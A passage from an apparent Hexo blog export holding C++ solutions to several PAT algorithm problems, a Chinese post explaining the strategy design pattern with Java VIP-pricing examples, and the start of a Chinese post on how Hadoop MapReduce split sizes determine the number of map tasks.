<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT A1044</span></span><br><span class="line"><span class="keyword">int</span> value[<span class="number">100001</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> N,M;</span><br><span class="line">    <span class="keyword">int</span> near_M=<span class="number">100000001</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;N,&amp;M);</span><br><span class="line">    value[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=N;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;value[i]);</span><br><span class="line">        value[i]+=value[i<span class="number">-1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=N;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> j=upper_bound(value+i,value+N+<span class="number">1</span>,value[i<span class="number">-1</span>]+M)-value;</span><br><span class="line">        <span class="keyword">if</span>(value[j<span class="number">-1</span>]-value[i<span class="number">-1</span>]==M)&#123;</span><br><span class="line">            near_M=M;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(j&lt;=N&amp;&amp;value[j]-value[i<span class="number">-1</span>]&lt;near_M)&#123;</span><br><span class="line">            near_M=value[j]-value[i<span class="number">-1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=N;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> j=upper_bound(value+i,value+N+<span class="number">1</span>,value[i<span class="number">-1</span>]+near_M)-value;</span><br><span class="line">        <span class="keyword">if</span>(value[j<span class="number">-1</span>]-value[i<span class="number">-1</span>]==near_M)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d-%d\n&quot;</span>,i,j<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="4-6"><a href="#4-6" class="headerlink" title="4.6"></a>4.6</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT B1035</span></span><br><span class="line"><span class="keyword">int</span> origin[<span class="number">101</span>],copys[<span class="number">101</span>],<span class="keyword">final</span>[<span class="number">101</span>];</span><br><span class="line"><span class="keyword">int</span> N;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">same</span><span class="params">(<span class="keyword">int</span> a[],<span class="keyword">int</span> b[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;N;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i]!=b[i]) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">output</span><span class="params">(<span class="keyword">int</span> a[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;N<span class="number">-1</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,a[N<span class="number">-1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">mergesort</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">bool</span> flag=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> step=<span class="number">2</span>;step/<span class="number">2</span>&lt;=N;step*=<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(step!=<span class="number">2</span>&amp;&amp;same(copys,<span class="keyword">final</span>)) flag=<span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;N;i+=step)&#123;</span><br><span class="line">            sort(copys+i,copys+min(step+i,N));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(flag==<span class="literal">true</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Merge Sort\n&quot;</span>);</span><br><span class="line">            output(copys);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">insertsort</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">bool</span> flag=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;N;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i!=<span class="number">1</span>&amp;&amp;same(copys,<span class="keyword">final</span>)) flag=<span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">int</span> temp=copys[i];</span><br><span class="line">        <span class="keyword">int</span> j=i;</span><br><span class="line">        <span class="keyword">while</span>(j&gt;<span class="number">0</span>&amp;&amp;copys[j<span class="number">-1</span>]&gt;temp)&#123;</span><br><span class="line">            copys[j]=copys[j<span class="number">-1</span>];</span><br><span class="line">            j--;</span><br><span class="line">        &#125;</span><br><span class="line">        copys[j]=temp;</span><br><span class="line">        <span class="keyword">if</span>(flag==<span class="literal">true</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;N);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;N;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;origin[i]);</span><br><span class="line">        copys[i]=origin[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;N;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;<span class="keyword">final</span>[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(insertsort())&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Insertion Sort\n&quot;</span>);</span><br><span class="line">        output(copys);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;N;i++)&#123;</span><br><span class="line">            copys[i]=origin[i];</span><br><span class="line">        &#125;</span><br><span class="line">        mergesort();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT A1029</span></span><br><span class="line"><span class="keyword">int</span> N[<span class="number">400001</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,m;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;N[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;m);</span><br><span class="line">    <span class="keyword">for</span>(;i&lt;m+n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;N[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    sort(N,N+n+m);</span><br><span class="line">    <span class="keyword">int</span> mid=(m+n<span class="number">-1</span>)/<span class="number">2</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,N[mid]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="4-7-1"><a href="#4-7-1" class="headerlink" title="4.7"></a>4.7</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT B1045</span></span><br><span class="line"><span class="keyword">int</span> N[<span class="number">100001</span>];</span><br><span class="line"><span class="keyword">int</span> leftMAX[<span class="number">100001</span>];</span><br><span class="line"><span class="keyword">int</span> rightMIN[<span class="number">100001</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(leftMAX,<span class="number">-1</span>,<span class="keyword">sizeof</span>(leftMAX));</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;N[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">        leftMAX[i]=max(N[i<span class="number">-1</span>],leftMAX[i<span class="number">-1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    rightMIN[n<span class="number">-1</span>]=<span class="number">0x7fffffff</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=n<span class="number">-2</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">        rightMIN[i]=min(rightMIN[i+<span class="number">1</span>],N[i+<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> count=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> ans[n];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(leftMAX[i]&lt;N[i]&amp;&amp;N[i]&lt;rightMIN[i])&#123;</span><br><span class="line">            ans[count++]=N[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,count);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;count;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,ans[i]);</span><br><span class="line">        <span class="keyword">if</span>(i&lt;count<span class="number">-1</span>)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);   <span class="comment">//这次结尾一定要换行</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>设计模式收集</title>
    <url>/2021/08/07/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E6%94%B6%E9%9B%86/</url>
    <content><![CDATA[<p>ing，整理常见的设计模式</p>
<span id="more"></span>

<h2 id="策略模式"><a href="#策略模式" class="headerlink" title="策略模式"></a>策略模式</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>在软件开发中也常常遇到类似的情况，实现某一个功能有多种算法或者策略，我们可以根据环境或者条件的不同选择不同的算法或者策略来完成该功能。如查找、排序等，一种常用的方法是硬编码(Hard Coding)在一个类中，如需要提供多种查找算法，可以将这些算法写到一个类中，在该类中提供多个方法，每一个方法对应一个具体的查找算法；当然也可以将这些查找算法封装在一个统一的方法中，通过if…else…或者case等条件判断语句来进行选择。这两种实现方法我们都可以称之为硬编码，如果需要增加一种新的查找算法，需要修改封装算法类的源代码；更换查找算法，也需要修改客户端调用代码。在这个算法类中封装了大量查找算法，该类代码将较复杂，维护较为困难。如果我们将这些策略包含在客户端，这种做法更不可取，将导致客户端程序庞大而且难以维护，如果存在大量可供选择的算法时问题将变得更加严重。</p>
<p>策略模式把对象本身和运算规则区分开来，其功能非常强大，因为这个设计模式本身的核心思想就是面向对象编程的多形性的思想。</p>
<h3 id="例子：策略模式代替if-else"><a href="#例子：策略模式代替if-else" class="headerlink" title="例子：策略模式代替if-else"></a>例子：策略模式代替if-else</h3><h4 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h4><p>根据用户vip等级来返回不同的价格，vip等级是不固定的，随时可能要增加，价格也不是固定的。</p>
<h4 id="if-else写法"><a href="#if-else写法" class="headerlink" title="if-else写法"></a>if-else写法</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 如果有新增类型，就需要频繁的修改此处的代码！</span></span><br><span class="line"><span class="comment"> * 不符合开闭原则！</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> xiaoyuyu</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonGetPrice</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String VIP1=<span class="string">&quot;v1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String VIP2=<span class="string">&quot;v2&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String VIP3=<span class="string">&quot;v3&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String VIP4=<span class="string">&quot;v4&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取vip的价格</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> type vip类型</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> price 原价格</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">double</span> <span class="title">getVipPrice</span><span class="params">(String type, <span class="keyword">double</span> price)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (type.equals(VIP1)) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;不使用策略模式---不打折,原价&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> price;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (type.equals(VIP2)) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;不使用策略模式---打九折&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> price * <span class="number">0.9</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (type.equals(VIP3)) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;不使用策略模式---打八五折&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> price * <span class="number">0.85</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (type.equals(VIP4)) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;不使用策略模式---打八折&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> price * <span class="number">0.8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> price;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="使用策略模式"><a href="#使用策略模式" class="headerlink" title="使用策略模式"></a>使用策略模式</h4><h5 id="定义策略接口"><a href="#定义策略接口" class="headerlink" title="定义策略接口"></a>定义策略接口</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 策略接口</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> xiaoyuyu</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Strategy</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">     <span class="function"><span class="keyword">double</span> <span class="title">getVipPrice</span><span class="params">(<span class="keyword">double</span> originPrice)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="不同算法实现类"><a href="#不同算法实现类" class="headerlink" title="不同算法实现类"></a>不同算法实现类</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">VipOneStrategy</span> <span class="keyword">implements</span> <span class="title">Strategy</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * vip1 不打折</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> originPrice</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">getVipPrice</span><span class="params">(<span class="keyword">double</span> originPrice)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;使用策略模式---不打折,原价&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> originPrice;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">VipTwoStrategy</span> <span class="keyword">implements</span> <span class="title">Strategy</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">getVipPrice</span><span class="params">(<span class="keyword">double</span> originPrice)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;使用策略模式---打九折&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> originPrice * <span class="number">0.9</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">VipThreeStrategy</span> <span class="keyword">implements</span> <span class="title">Strategy</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">getVipPrice</span><span class="params">(<span class="keyword">double</span> originPrice)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;使用策略模式---打八五折&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> originPrice * <span class="number">0.85</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">VipFourStrategy</span> <span class="keyword">implements</span> <span class="title">Strategy</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">getVipPrice</span><span class="params">(<span class="keyword">double</span> originPrice)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;使用策略模式---打八折&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> originPrice * <span class="number">0.8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="定义上下文，上下文持有策略接口的引用"><a href="#定义上下文，上下文持有策略接口的引用" class="headerlink" title="定义上下文，上下文持有策略接口的引用"></a>定义上下文，上下文持有策略接口的引用</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 负责和具体的策略类交互</span></span><br><span class="line"><span class="comment"> * 这样的话，具体的算法和直接的客户端调用分离了，使得算法可以独立于客户端独立的变化。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">VipContext</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 当前采用的算法对象</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> Strategy strategy;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">VipContext</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 可以通过构造器来注入</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">VipContext</span><span class="params">(Strategy strategy)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        <span class="keyword">this</span>.strategy = strategy;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 可以通过set方法来注入</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setStrategy</span><span class="params">(Strategy strategy)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.strategy = strategy;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">getVipPrice</span><span class="params">(<span class="keyword">double</span> originPrice)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> strategy.getVipPrice(originPrice);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>调优</title>
    <url>/2021/09/05/%E8%B0%83%E4%BC%98/</url>
    <content><![CDATA[<p>平时学习的一些调优技巧和调优思路整理，会不断更新。</p>
<p><a href="https://time.geekbang.org/column/article/375383">参考链接1</a></p>
<span id="more"></span>

<h2 id="Hadoop"><a href="#Hadoop" class="headerlink" title="Hadoop"></a>Hadoop</h2><h3 id="MapReduce中的map个数"><a href="#MapReduce中的map个数" class="headerlink" title="MapReduce中的map个数"></a>MapReduce中的map个数</h3><p>在map阶段读取数据前，FileInputFormat会将输入文件分割成split。split的个数决定了map的个数。影响map个数（split个数）的主要因素有：</p>
<ol>
<li><p>文件的大小。当块（dfs.block.size）为128m时，如果输入文件为128m，会被划分为1个split；当块为256m，会被划分为2个split。</p>
</li>
<li><p>文件的个数。FileInputFormat按照文件分割split，并且只会分割大文件，即那些大小超过HDFS块的大小的文件。如果HDFS中dfs.block.size设置为128m，而输入的目录中文件有100个，则划分后的split个数至少为100个。</p>
</li>
<li><p>splitsize的大小。分片是按照splitszie的大小进行分割的，一个split的大小在没有设置的情况下，默认等于hdfs block的大小。但应用程序可以通过两个参数来对splitsize进行调节</p>
</li>
</ol>
<p> $InputSplit=Math.max(minSize, Math.min(maxSize, blockSize)$</p>
<p>总结如下：</p>
<ul>
<li>当mapreduce.input.fileinputformat.split.maxsize &gt; mapreduce.input.fileinputformat.split.minsize &gt; dfs.blockSize的情况下，此时的splitSize 将由mapreduce.input.fileinputformat.split.minsize参数决定</li>
<li>当mapreduce.input.fileinputformat.split.maxsize &gt; dfs.blockSize &gt; mapreduce.input.fileinputformat.split.minsize的情况下，此时的splitSize 将由dfs.blockSize配置决定</li>
<li>当dfs.blockSize &gt; mapreduce.input.fileinputformat.split.maxsize &gt; mapreduce.input.fileinputformat.split.minsize的情况下，此时的splitSize将由mapreduce.input.fileinputformat.split.maxsize参数决定。</li>
</ul>
